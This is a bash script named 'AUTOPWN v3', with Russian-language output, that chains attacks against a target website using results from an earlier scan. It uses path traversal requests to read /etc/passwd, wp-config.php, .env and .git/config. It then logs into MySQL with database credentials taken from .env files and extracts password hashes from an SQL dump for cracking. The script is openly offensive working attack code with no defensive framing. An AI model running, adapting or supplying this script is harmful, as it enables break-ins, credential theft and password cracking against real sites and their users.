#!/bin/bash
TARGET=$1
SCAN_DIR=$(ls -t ~/shadow_scan_* ~/scan_* 2>/dev/null | head -1)
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1
[ -z "$SCAN_DIR" ] && echo "[AUTOPWN] Нет данных скана" && exit 1

echo "[AUTOPWN v3] Строю цепочки атак..."

# Цепочка 1: LFI → конфиги → пароли
if [ -f "$SCAN_DIR/hacked/lfi.txt" ]; then
    echo "[AUTOPWN] LFI → читаю конфиги..."
    for path in /etc/passwd wp-config.php .env .git/config; do
        curl -sk --max-time 5 "$TARGET?file=../../$path" 2>/dev/null | grep -q "root:\|DB_PASSWORD\|password" && \
            echo "  🔗 $path прочитан!"
    done
fi

# Цепочка 2: .env → пароль БД → MySQL
if [ -f "$SCAN_DIR/hacked/env_credentials.txt" ]; then
    echo "[AUTOPWN] .env → пробую MySQL..."
    while read line; do
        host=$(echo "$line" | grep -oP 'DB_HOST=\K\S+')
        user=$(echo "$line" | grep -oP 'DB_USER=\K\S+')
        pass=$(echo "$line" | grep -oP 'DB_PASS=\K\S+')
        [ -n "$host" ] && [ -n "$pass" ] && mysql -h "$host" -u "$user" -p"$pass" -e "SHOW DATABASES;" 2>/dev/null && echo "  🔗 MySQL доступен!"
    done < "$SCAN_DIR/hacked/env_credentials.txt"
fi

# Цепочка 3: SQL дамп → хеши → john
if [ -f "$SCAN_DIR/hacked/sql_dump.txt" ]; then
    echo "[AUTOPWN] SQL → извлекаю хеши..."
    grep -oE '[a-f0-9]{32}|[a-f0-9]{40}|\$2[ayb]\$[^ ]+' "$SCAN_DIR/hacked/sql_dump.txt" | sort -u > "$SCAN_DIR/hacked/hashes.txt"
    echo "  🔗 Хешей: $(wc -l < "$SCAN_DIR/hacked/hashes.txt")"
fi

echo "[AUTOPWN v3] Цепочки построены"
